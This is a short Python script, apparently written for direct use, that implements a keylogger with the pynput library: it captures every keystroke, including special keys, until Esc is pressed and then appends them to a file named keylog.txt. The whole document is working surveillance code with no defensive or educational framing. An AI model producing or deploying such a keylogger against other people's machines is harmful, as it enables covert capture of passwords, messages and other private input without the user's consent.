from pynput.keyboard import Key, Listener

# Define the log file where keystrokes will be saved
log_file = "keylog.txt"

# Initialize an empty string to store the keystrokes
keystrokes = ""

def on_key_press(key):
    global keystrokes
    try:
        # Append the key to the keystrokes string
        keystrokes += str(key.char)
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            keystrokes += " "
        elif key == Key.enter:
            keystrokes += "\n"
        else:
            keystrokes += f"[{key}]"

def on_key_release(key):
    if key == Key.esc:
        # If the 'Esc' key is pressed, stop the keylogger
        return False

# Create a listener that listens for key events
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Write the captured keystrokes to a log file
with open(log_file, "a") as f:
    f.write(keystrokes)
